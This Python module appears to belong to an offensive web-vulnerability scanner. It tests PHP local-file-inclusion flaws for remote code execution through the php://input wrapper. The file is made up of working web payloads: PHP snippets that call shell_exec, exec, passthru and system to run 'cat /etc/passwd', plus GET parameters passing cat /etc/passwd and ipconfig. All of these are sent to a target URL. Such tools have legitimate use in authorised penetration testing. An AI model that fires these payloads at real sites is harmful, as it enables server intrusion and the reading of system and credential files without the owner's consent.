"""Input"""
from src.utils.arguments import init_args
from src.configs.config import proxies
from src.httpreqs.request import prepareRequest
from src.httpreqs.request import REQUEST
from src.utils.colors import Colors


def test_input(url, post):
    """Test Input"""
    args  = init_args()
    if args['verbose']:
        print(Colors().blue("[i]") + " Testing with input wrapper...", flush = True)

    tests = []
    posts = []

    if args['is_tested_param_post']:
        posts.append(
            "<?php echo(shell_exec('cat /etc/passwd'));?>/*&"
            + post.replace(args['param'], "php://input")
        )
        posts.append(
            "<?php echo(exec('cat /etc/passwd');?>/*&"
            + post.replace(args['param'], "php://input")
        )
        posts.append(
            "<?php echo(passthru('cat /etc/passwd'));?>/*&"
            + post.replace(args['param'], "php://input")
        )
        posts.append(
            "<?php echo(system('cat /etc/passwd'));?>/*&"
            + post.replace(args['param'], "php://input")
        )
    else:
        tests.append("php%3a%2f%2finput&cmd=cat%20%2Fetc%2Fpasswd")
        tests.append("php%3a%2f%2finput&cmd=ipconfig")

        posts.append("<?php echo(shell_exec($_GET['cmd']));?>")
        posts.append("<?php echo(exec($_GET['cmd']));?>")
        posts.append("<?php echo(passthru($_GET['cmd']));?>")
        posts.append("<?php echo(system($_GET['cmd']));?>")

    if args['is_tested_param_post']:
        for i, p in enumerate(posts):
            u, reqHeaders, postTest = prepareRequest(args['param'], "", url, p)
            _, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "INPUT")
            if not br:
                return
            if i == 1 and args['quick']:
                return
        return

    for _, test in enumerate(tests):
        u, reqHeaders, _ = prepareRequest(args['param'], test, url, post)
        for j, post in enumerate(posts):
            _, br = REQUEST(u, reqHeaders, post, proxies, "RCE", "INPUT")

            if not br:
                return

            if j == 1 and args['quick']:
                return

    return
